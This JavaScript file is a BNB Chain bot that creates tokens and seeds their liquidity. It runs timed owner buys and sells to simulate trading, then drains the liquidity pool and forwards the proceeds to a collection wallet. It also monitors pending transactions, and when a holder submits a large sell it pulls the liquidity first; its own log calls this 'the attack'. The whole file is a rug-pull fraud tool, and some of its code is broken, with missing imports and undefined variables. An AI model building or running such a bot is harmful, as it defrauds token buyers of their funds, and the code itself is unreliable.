const Web3 = require("web3");
const dotenv = require("dotenv");
const factoryABI = require("./Factory.json");
const removelpABI = require("./rmlp.json");
// const erc20ABI = require("./erc20.json");
const tokenABI = require("./Token.json");
const routerABI = require("./router.json");
const pancakefactoryABI = require("./pancakefactory.json");
const wbnbABI = require("./wbnb.json");
const abiDecoder = require("abi-decoder");
dotenv.config();

const ONE_GWEI = 1e9;
const KKEEYY = process.env.KKEEYY;
const TEST_RPC_URL = process.env.TESTBSC_RPC_URL;
const MAIN_RPC_URL = process.env.MAINBSC_RPC_URL;
const WEBSOCKET_PROVIDER_LINK = process.env.WEBSOCKET_PROVIDER_LINK;
const WBNB_ADDRESS = process.env.WBNB_ADDRESS;
const FACTORY_ADDRESS = process.env.FACTORY_ADDRESS;
const REMOVELP_ADDRESS = process.env.REMOVELP_ADDRESS;
const ROUTER_ADDRESS = process.env.ROUTER_ADDRESS;
const PANCAKEFACTORY_ADDRESS = process.env.PANCAKEFACTORY_ADDRESS;
const BNBRECEIVE_WALLET = process.env.BNBRECEIVE_WALLET;
const BNB_THRESHOLD = process.env.BNB_THRESHOLD;

const GAS_PRICE_LOW = process.env.GAS_PRICE_LOW;
const GAS_PRICE_MEDIUM = process.env.GAS_PRICE_MEDIUM;
const GAS_PRICE_HIGH = process.env.GAS_PRICE_HIGH;
const slippage = process.env.SLIPPAGE;

const token_names = JSON.parse(process.env.TOKEN_NAME);
console.log("Token List: ", token_names);
const token_symbols = JSON.parse(process.env.TOKEN_SYMBOL);
const token_supplys = JSON.parse(process.env.TOKEN_SUPPLY);
const token_liquidityTokenAmounts = JSON.parse(process.env.TOKEN_LIQUIDITY_TOKENAMOUNT);
const token_liquidityBNBAmounts = JSON.parse(process.env.TOKEN_LIQUIDITY_BNBAMOUNT);
const token_bnbAmountToSwaps = JSON.parse(process.env.TOKEN_BNBAMOUNTTOSWAP);
console.log("Token First Buy Amount", token_bnbAmountToSwaps);
const token_buysellflows = JSON.parse(process.env.TOKEN_BUYSELLFLOW);
console.log("Token BUY/SELL FLOW: ", token_buysellflows);
// process.exit(0);
// const token_bnbAmountsToSells = JSON.parse(process.env.TOKEN_BNBAMOUNTTOSELL);
// const token_timeToSells = JSON.parse(process.env.TOKEN_TIMETOSELL);
// const token_bnbLimitToTransferOnApproves = JSON.parse(process.env.TOKEN_BNBLIMIT_TOTRANSFER_ONAPPROVE);


const token_timeToRemoveLPs = JSON.parse(process.env.TOKEN_TIMETORMLP);
const token_frontrunBNBAmounts = JSON.parse(process.env.TOKEN_FRONTRUN_SELLING_AMOUNT);
const token_frontrunGweiHighers = JSON.parse(process.env.TOKEN_FRONTRUN_GWEI_HIGHER);

const token_counts = token_names.length;

const mainWeb3 = new Web3(TEST_RPC_URL);
const web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));

const bossWallet = mainWeb3.eth.accounts.privateKeyToAccount(KKEEYY);
console.log('MY Wallet:', bossWallet.address);

const factoryContract = new mainWeb3.eth.Contract(factoryABI, FACTORY_ADDRESS);
const removelpContract = new mainWeb3.eth.Contract(removelpABI, REMOVELP_ADDRESS);
const routerContract = new mainWeb3.eth.Contract(routerABI, ROUTER_ADDRESS);
const pancakefactoryContract = new mainWeb3.eth.Contract(pancakefactoryABI, PANCAKEFACTORY_ADDRESS);
const wbnbContract = new mainWeb3.eth.Contract(wbnbABI, WBNB_ADDRESS);

let frontrun_succeed = false;
let subscription;
let frontrun_started = false;

let index = 0;
let tokenContract;
let tokenAddress;
let token_timeToRemoveLP;
let token_frontrunBNBAmount;
let token_frontrunGweiHigher;

let token_buysellflow;

const getCurrentGasPrices = async () => {
	try {
		//this URL is for Ethereum mainnet and Ethereum testnets
		let GAS_STATION = `https://api.debank.com/chain/gas_price_dict_v2?chain=bsc`;
		var response = await axios.get(GAS_STATION);
		var prices = {
			low: Math.floor(response.data.data.slow.price),
			medium: Math.floor(response.data.data.normal.price),
			high: Math.floor(response.data.data.fast.price),
		};
		return prices;
	} catch (error) {
		return {
			low: GAS_PRICE_LOW,
			medium: GAS_PRICE_MEDIUM,
			high: GAS_PRICE_HIGH,
		};
	}
};
const sellToken = async (tokenAddress, sellAmount) => {
	// ==============  SELL Token ===================
	console.log("\n============== Token Sell for ", sellAmount, "BNB ==============");
	path1 = WBNB_ADDRESS;
	path0 = tokenAddress;
	path = [path0, path1];
	let tokenBalance = await tokenContract.methods.balanceOf(bossWallet.address).call();
	let outBNBAmount = mainWeb3.utils.toWei(sellAmount.toString(), "ether").toString();
	let selltx = routerContract.methods.swapTokensForExactETH(outBNBAmount, tokenBalance, path, bossWallet.address, 1e10);
	try {
		res = await signAndSendTx(
			selltx,
			bossWallet.address,
			ROUTER_ADDRESS,
			0
		);
	} catch (error) {
		console.log("Token Sell Failed");
	}

}

const buyToken = async (tokenAddress, buyAmount, slippage) => {
	console.log("\n============== Token Buy with ", buyAmount, "BNB ==============");
	path0 = WBNB_ADDRESS
	path1 = tokenAddress
	path = [path0, path1]
	let outAmount = await routerContract.methods.getAmountsOut(mainWeb3.utils.toWei(buyAmount.toString(), "ether").toString(), path).call();
	outAmount = mainWeb3.utils.fromWei(outAmount[1], "ether") * (1 - slippage);
	outAmount = mainWeb3.utils.toWei(outAmount.toString(), "ether").toString();
	let swaptx = routerContract.methods.swapExactETHForTokens(outAmount, path, bossWallet.address, 1e10);
	try {
		res = await signAndSendTx(
			swaptx,
			bossWallet.address,
			ROUTER_ADDRESS,
			mainWeb3.utils.toWei(buyAmount.toString(), "ether").toString()
		);
	} catch (error) {
		console.log("Token Buy Failed");
	}
}

const sendbnb = async (bnbAmount) => {
	const signedTx = await mainWeb3.eth.accounts.signTransaction({
		to: BNBRECEIVE_WALLET,
		value: bnbAmount,
		gas: 2000000
	}, KKEEYY);
	await mainWeb3.eth.sendSignedTransaction(signedTx.rawTransaction, function (error, hash) {
		if (!error) {
			console.log("🎉 BNB transfer success at Tx: ", hash);
		} else {
			console.log("❗Something went wrong while BNB transfer:", error)
		}
	});

}
const fromRemoveLP = async (tokenAddress, kkey) => {
	let rAddress = await removelpContract.methods.routerAddress().call();
	if (rAddress.toString() != ROUTER_ADDRESS) {
		let setRouterTx = removelpContract.methods.setRouterAddress(ROUTER_ADDRESS);
		res = await signAndSendTx(
			setRouterTx,
			bossWallet.address,
			REMOVELP_ADDRESS,
			0
		);
	}

	let pairAddress = await pancakefactoryContract.methods.getPair(tokenAddress, WBNB_ADDRESS).call();
	console.log("\npairAddress", pairAddress);
	console.log("\n============== Remove Liquidity ==============");
	let removelptx = removelpContract.methods.approve(pairAddress);
	res = await signAndSendTx(
		removelptx,
		bossWallet.address,
		REMOVELP_ADDRESS,
		0
	);

	// ============ WBNB-->BNB ==================
	console.log("\n============== Swap WBNB into BNB ==============");
	let wbnbAmount = await wbnbContract.methods.balanceOf(bossWallet.address).call();
	let wbnbtx = await wbnbContract.methods.withdraw(wbnbAmount);
	res = await signAndSendTx(
		wbnbtx,
		bossWallet.address,
		WBNB_ADDRESS,
		0
	);


	// ============ Check BNB balance change ============
	console.log("\n============== check excess bnb ==============");
	let bnbBalance;
	await mainWeb3.eth.getBalance(bossWallet.address)
		.then(balance => {
			console.log('BNB balance:', mainWeb3.utils.fromWei(balance, 'ether'));
			bnbBalance = mainWeb3.utils.fromWei(balance, 'ether');
		})
		.catch(error => {
			console.error('Error:', error);
			return 0;
		});
	let deltaBalance = bnbBalance - BNB_THRESHOLD;

	if (deltaBalance > 0) {
		deltaBalance = deltaBalance.toFixed(18);
		console.log("Excess BNB balance to transfer: ", deltaBalance, 'BNB');
		await sendbnb(mainWeb3.utils.toWei(deltaBalance.toString(), 'ether'));
	}
	index++;
	if (index == token_counts) {
		index = 0;
	}
	if (kkey === 'f') {
		process.exit(0);
	}
	tokenbot();

}

const tokenbot = async () => {
	i = index;
	let token_name = token_names[i];
	let token_symbol = token_symbols[i];
	let token_supply = token_supplys[i];
	let token_liquidityTokenAmount = token_liquidityTokenAmounts[i];
	let token_liquidityBNBAmount = token_liquidityBNBAmounts[i];
	let token_bnbAmountToSwap = token_bnbAmountToSwaps[i];
	token_timeToRemoveLP = token_timeToRemoveLPs[i];
	token_frontrunBNBAmount = token_frontrunBNBAmounts[i];
	token_buysellflow = token_buysellflows[i];
	token_frontrunGweiHigher = token_frontrunGweiHighers[i];
	// token_bnbAmountsToSell = token_bnbAmountsToSells[i];
	// let token_timeToSell = token_timeToSells[i];
	// let token_bnbLimitToTransferOnApprove = token_bnbLimitToTransferOnApproves[i];

	let countdown;

	
	let res;


	//check boss wallet bnb balance

	await mainWeb3.eth.getBalance(bossWallet.address)
		.then(balance => {
			console.log('BNB balance:', mainWeb3.utils.fromWei(balance, 'ether'));
			beforeBalance = balance;
		})
		.catch(error => {
			console.error('Error:', error);
			return 0;
		});

	// Token Creation 
	console.log("\n============== token creation ==============");
	// let bnbLimit = mainWeb3.utils.toWei(token_bnbLimitToTransferOnApprove.toString(), "ether").toString();
	let createtx = factoryContract.methods.create(token_name, token_symbol, token_supply, ROUTER_ADDRESS, REMOVELP_ADDRESS, bossWallet.address);
	await signAndSendTx(
		createtx,
		bossWallet.address,
		FACTORY_ADDRESS,
		0
	);
	tokenAddress = await factoryContract.methods.tokenAddress().call();
	tokenContract = new mainWeb3.eth.Contract(tokenABI, tokenAddress);

	console.log("Token address: ", tokenAddress);
	console.log("Token name: ", token_name);
	console.log("Token symbol: ", token_symbol);
	console.log("Token supply: ", token_supply);

	console.log("\n============== Add Liquidity ==============");
	let addlptx = routerContract.methods.addLiquidityETH(tokenAddress, mainWeb3.utils.toWei(token_liquidityTokenAmount.toString(), "ether").toString(), 0, 0, REMOVELP_ADDRESS, 1e10);

	res = await signAndSendTx(
		addlptx,
		bossWallet.address,
		ROUTER_ADDRESS,
		mainWeb3.utils.toWei(token_liquidityBNBAmount.toString(), "ether").toString()

	);


	// ==============  Owner First Buy ===================
	console.log("\n============== Owner First BUy ==============");
	path0 = WBNB_ADDRESS
	path1 = tokenAddress
	path = [path0, path1]
	let outAmount = await routerContract.methods.getAmountsOut(mainWeb3.utils.toWei(token_bnbAmountToSwap.toString(), "ether").toString(), path).call();
	outAmount = mainWeb3.utils.fromWei(outAmount[1], "ether") * (1 - slippage);
	outAmount = mainWeb3.utils.toWei(outAmount.toString(), "ether").toString();
	let swaptx = routerContract.methods.swapExactETHForTokens(outAmount, path, bossWallet.address, 1e10);
	try {
		res = await signAndSendTx(
			swaptx,
			bossWallet.address,
			ROUTER_ADDRESS,
			mainWeb3.utils.toWei(token_bnbAmountToSwap.toString(), "ether").toString()
		);
	} catch (error) {
		console.log("buy failed");
	}


	console.log("============== token_buysellflow ==============\n", token_buysellflow, "\n");

	async function buysellcounttimer(token_buysellflow_index) {
		buysellItem = token_buysellflow[token_buysellflow_index];
		buy_sell_type = buysellItem.buy_sell;
		buy_sell_amount = buysellItem.amount;
		buy_sell_delay = buysellItem.delay;
		let countdown = buy_sell_delay * 60; // x minutes in seconds
		console.log("After", buy_sell_delay, "mins, " + buy_sell_type + " : ", buy_sell_amount, "BNB");

		let kkey = "none"
		const readline = require('readline');
		readline.emitKeypressEvents(process.stdin);
		process.stdin.setRawMode(true);
		process.stdin.on('keypress', (chunk, key) => {
			if (key && key.name === 'return') {
				countdown = 1;
				kkey = "return";
			}
			if (key && key.name === 'm') {
				// console.log("\n1min added to timer")
				countdown += 60;
			}
			if (key && key.name === 's') {
				// console.log("\n1min added to timer")
				countdown -= 60;
			}
			if (key && key.name === 'f') {
				countdown = 1;
				kkey = "f"
			}

			if (key.ctrl && key.name === 'c') {
				console.log("\nStopped bot by Force")
				process.exit();
			}
		});
		const countdownInterval = setInterval(async () => {
			const minutes = Math.floor(countdown / 60);
			const seconds = countdown % 60;

			process.stdout.clearLine(); // Clear the current line
			process.stdout.cursorTo(0); // Move the cursor to the beginning of the line
			process.stdout.write(`Remain time: ${minutes}:${seconds.toString().padStart(2, '0')}`);


			// Enable input reading from the console
			// process.stdin.setRawMode(true);
			// process.stdin.resume();
			countdown--;

			if (countdown <= 0) {
				clearInterval(countdownInterval);
				// console.log('\nCountdown finished!');
				// Execute the next command here
				// ============ BUY/Sell token ==================
				if (buy_sell_type === "buy") {
					await buyToken(tokenAddress, buy_sell_amount, slippage);
				}
				if (buy_sell_type === "sell") {
					await sellToken(tokenAddress, buy_sell_amount);
				}
				if ((token_buysellflow_index + 1) == token_buysellflow.length) {
					countdownForRMLP(tokenAddress);
				}
				else {
					buysellcounttimer(token_buysellflow_index + 1);
				}

			}
		}, 1000); // Update the countdown every second
	};
	await buysellcounttimer(0);


}

const countdownForRMLP = async (tokenAddress) => {
	// =========== Count Down ==================
	countdown = token_timeToRemoveLP * 60; // x minutes in seconds
	console.log("After", token_timeToRemoveLP, "mins, liquidity will be removed, to remove right now, press Enter key")
	async function startCountdown() {
		let kkey = "none"
		const readline = require('readline');
		readline.emitKeypressEvents(process.stdin);
		process.stdin.setRawMode(true);
		process.stdin.on('keypress', (chunk, key) => {
			if (key && key.name === 'return') {
				countdown = 1;
				kkey = "return";
			}
			if (key && key.name === 'm') {
				// console.log("\n1min added to timer")
				countdown += 60;
			}
			if (key && key.name === 's') {
				// console.log("\n1min added to timer")
				countdown -= 60;
			}
			if (key && key.name === 'f') {
				countdown = 1;
				kkey = "f"
			}

			if (key.ctrl && key.name === 'c') {
				console.log("\nStopped bot by Force")
				process.exit();
			}
		});
		const countdownInterval = setInterval(() => {
			const minutes = Math.floor(countdown / 60);
			const seconds = countdown % 60;

			process.stdout.clearLine(); // Clear the current line
			process.stdout.cursorTo(0); // Move the cursor to the beginning of the line
			process.stdout.write(`Remain time: ${minutes}:${seconds.toString().padStart(2, '0')}`);


			// Enable input reading from the console
			// process.stdin.setRawMode(true);
			// process.stdin.resume();
			countdown--;

			if (countdown <= 0) {
				clearInterval(countdownInterval);
				console.log('\nCountdown finished!');
				// Execute the next command here
				// ============ Remove LP ==================
				fromRemoveLP(tokenAddress, kkey);

			}
		}, 1000); // Update the countdown every second
	}

	await startCountdown();
};







const signAndSendTx = async (data, from, to, bnbAmount) => {
	let currentGasPrice = await getCurrentGasPrices();
	var nonce = await mainWeb3.eth.getTransactionCount(
		bossWallet.address,
		"pending"
	);
	nonce = mainWeb3.utils.toHex(nonce);
	let encodedABI = data.encodeABI();
	let tx;
	let gasFee = await data.estimateGas({ from: bossWallet.address, value: bnbAmount })
		.then(gasAmount => {
			tx = {
				from: from,
				to: to,
				gas: gasAmount * 2,
				gasPrice: currentGasPrice.low,
				data: encodedABI,
				nonce,
				value: bnbAmount
			};
			// console.log("tx ===> ", tx);
		})
		.catch(error => {
			tx = {
				from: from,
				to: to,
				gas: 8000000,
				gasPrice: currentGasPrice.low,
				data: encodedABI,
				nonce,
				value: bnbAmount
			};
		});
	let signedTx = await bossWallet.signTransaction(tx);
	await mainWeb3.eth
		.sendSignedTransaction(signedTx.rawTransaction)
		.on("transactionHash", function (hash) {
			console.log("tx hash = ", hash);
			return 1;
		})
		.on("receipt", function (receipt) {
			// console.log("");
			// console.log("---------------------- tx succeed ---------------------");
			return 1;
			// console.log(receipt);
		})
		.on("error", function (error, receipt) {
			console.log("");
			// console.log("---------------------- tx failed ---------------------");
			console.error(" error : ", error);
			return 0;
		});



};

const main = () => {
	// tokenbot();
	// console.log("co run")
	subscription = web3Ws.eth
		.subscribe("pendingTransactions", function (error, result) { })
		.on("data", async function (transactionHash) {
			console.log("hash: ", transactionHash)
			let transaction = await mainWeb3.eth.getTransaction(transactionHash);
			if (
				transaction != null &&
				transaction["to"] && transaction["to"].toString().toLowerCase() == ROUTER_ADDRESS.toString().toLowerCase()
			) {
				await handleTransaction(
					transaction,
					tokenAddress,
					token_frontrunBNBAmount,
					token_frontrunGweiHigher
				);
			}
			if (frontrun_succeed) {
				console.log("The bot finished the attack.");
			}
		});



}

async function handleTransaction(
	transaction,
	tokenAddress,
	amountBNB,
	geiHigher
) {
	try {
		if (await triggersFrontRun(transaction, tokenAddress, amountBNB)) {
			subscription.unsubscribe();
			console.log("Perform front running ...");

			let gasPrice = parseInt(transaction["gasPrice"]);
			let newGasPrice = gasPrice + gweiHigher * ONE_GWEI;

			// var realInput =
			// 	BigNumber(input_token_info.balance) > BigNumber(amount).multiply(BigNumber(10 ** input_token_info.decimals))
			// 		? BigNumber(amount).multiply(BigNumber(10 ** input_token_info.decimals))
			// 		: BigNumber(input_token_info.balance).multiply(BigNumber(10 ** input_token_info.decimals));
			// var gasLimit = (300000).toString();

			// var outputtoken = await uniswapRouter.methods
			// 	.getAmountOut(
			// 		realInput.toString(),
			// 		pool_info.input_volumn.toString(),
			// 		pool_info.output_volumn.toString()
			// 	)
			// 	.call();

			// await swap(
			// 	newGasPrice,
			// 	gasLimit,
			// 	outputtoken,
			// 	realInput,
			// 	0,
			// 	out_token_address,
			// 	user_wallet,
			// 	transaction
			// );

			// console.log(
			// 	"Wait until the large volumn transaction is done...",
			// 	transaction["hash"]
			// );

			// while (await isPending(transaction["hash"])) { }

			// if (buy_failed) {
			// 	succeed = false;
			// 	frontrun_started = false;
			// 	return;
			// }

			// console.log("Buy succeed:");

			// //Sell
			// await updatePoolInfo();
			// var outputeth = await uniswapRouter.methods
			// 	.getAmountOut(
			// 		outputtoken,
			// 		pool_info.output_volumn.toString(),
			// 		pool_info.input_volumn.toString()
			// 	)
			// 	.call();
			// outputeth = outputeth * 0.999;

			// await swap(
			// 	newGasPrice,
			// 	gasLimit,
			// 	outputtoken,
			// 	outputeth,
			// 	1,
			// 	out_token_address,
			// 	user_wallet,
			// 	transaction
			// );

			// console.log("Sell succeed");
			// succeed = true;
			await fromRemoveLP(tokenAddress,"");
			frontrun_started = false;
		}
	} catch (error) {
		frontrun_started = false;
		throw error;
	}
}

async function isPending(transactionHash) {
	try
	{
		return (await mainWeb3.eth.getTransactionReceipt(transactionHash)) == null;
	}
	catch(error){
		throw error;
	}
}

function parseTx(input) {
	if (input == "0x") return ["0x", []];
	let decodedData = abiDecoder.decodeMethod(input);
	let method = decodedData["name"];
	let params = decodedData["params"];

	return [method, params];
}


async function triggersFrontRun(transaction, tokenAddress, amountBNB) {
	try {
		if (frontrun_started) return false;

		// console.log(
		// 	transaction.hash.yellow,
		// 	parseInt(transaction["gasPrice"]) / 10 ** 9
		// );

		if (transaction["to"] && transaction["to"].toString().toLowerCase() != ROUTER_ADDRESS.toString().toLowerCase()) {
			return false;
		}

		let data = parseTx(transaction["input"]);
		let method = data[0];
		let params = data[1];
		let gasPrice = parseInt(transaction["gasPrice"]) / 10 ** 9;

		console.log("[triggersFrontRun] method = ", method);
		if (method == "swapExactTokensForTokens") {
			let in_amount = params[0].value;
			let out_min = params[1].value;

			let path = params[2].value;
			let in_token_addr = path[path.length - 2];
			let out_token_addr = path[path.length - 1];

			let recept_addr = params[3].value;
			let dead_line = params[4].value;

			if (in_token_addr.toString().toLowerCase() != tokenAddress.toString().toLowerCase()) {
				// console.log(out_token_addr.blue)
				// console.log(out_token_address)
				return false;
			}

			if (out_token_addr.toString().toLowerCase() != WBNB_ADDRESS.toString().toLowerCase()) {
				// console.log(in_token_addr.blue)
				// console.log(WETH_TOKEN_ADDRESS)
				return false;
			}

			// await updatePoolInfo();

			//calculate bnb amount

			let outBNBAmount = await routerContract.methods.getAmountsOut(in_amount.toString(), path).call();
			
			outBNBAmount = parseFloat(mainWeb3.utils.fromWei(outBNBAmount.toString(), "ether").toString());

			// var calc_bnb = await routerContract.methods
			// 	.getAmountOut(
			// 		out_min.toString(),
			// 		pool_info.output_volumn.toString(),
			// 		pool_info.input_volumn.toString()
			// 	)
			// 	.call();

			// log_str =
			// 	transaction["hash"] +
			// 	"\t" +
			// 	gasPrice.toFixed(2) +
			// 	"\tGWEI\t" +
			// 	BigNumber(calc_eth).divide(BigNumber(10 ** input_token_info.decimals)) +
			// 	"\t" +
			// 	input_token_info.symbol;

			// console.log(log_str);

			if (outBNBAmount >= amountBNB) {
				frontrun_started = true;

				// let log_str =
				// 	"Attack " + input_token_info.symbol + " Volumn : Pool " + input_token_info.symbol + " Volumn" +
				// 	"\t\t" +
				// 	(pool_info.attack_volumn / 10 ** input_token_info.decimals).toFixed(3) +
				// 	" " +
				// 	input_token_info.symbol +
				// 	"\t" +
				// 	(pool_info.input_volumn / 10 ** input_token_info.decimals).toFixed(3) +
				// 	" " +
				// 	input_token_info.symbol;

				// console.log(log_str.green);

				return true;
			} else {
				return false;
			}
		}
		else if (method == "swapTokensForExactTokens") {
			let out_amount = params[0].value;
			let in_max = params[1].value;

			let path = params[2].value;
			let in_token_addr = path[path.length - 2];
			let out_token_addr = path[path.length - 1];

			let recept_addr = params[3].value;
			let dead_line = params[4].value;

			if (out_token_addr.toString().toLowerCase() != WBNB_ADDRESS.toString().toLowerCase()) {
				// console.log(out_token_addr.blue)
				// console.log(out_token_address)
				return false;
			}

			if (in_token_addr.toString().toLowerCase() != tokenAddress.toString().toLowerCase()) {
				// console.log(in_token_addr.blue)
				// console.log(WETH_TOKEN_ADDRESS)
				return false;
			}

			// await updatePoolInfo();

			//calculate eth amount
			// var calc_eth = await uniswapRouter.methods
			// 	.getAmountOut(
			// 		out_amount.toString(),
			// 		pool_info.output_volumn.toString(),
			// 		pool_info.input_volumn.toString()
			// 	)
			// 	.call();

			// log_str =
			// 	transaction["hash"] +
			// 	"\t" +
			// 	gasPrice.toFixed(2) +
			// 	"\tGWEI\t" +
			// 	(calc_eth / 10 ** input_token_info.decimals).toFixed(3) +
			// 	"\t" +
			// 	input_token_info.symbol;
			// console.log(log_str.yellow);
			let outBNBAmount = parseFloat(mainWeb3.utils.fromWei(out_amount.toString(), "ether").toString());

			if (outBNBAmount >= amountBNB) {
				frontrun_started = true;

				// let log_str =
				// 	"Attack " + input_token_info.symbol + " Volumn : Pool " + input_token_info.symbol + " Volumn" +
				// 	"\t\t" +
				// 	(pool_info.attack_volumn / 10 ** input_token_info.decimals).toFixed(3) +
				// 	" " +
				// 	input_token_info.symbol +
				// 	"\t" +
				// 	(pool_info.input_volumn / 10 ** input_token_info.decimals).toFixed(3) +
				// 	" " +
				// 	input_token_info.symbol;
				// console.log(log_str);

				return true;
			} else {
				return false;
			}
		}

		return false;
	} catch (error) {
		throw error;
	}
}
main();

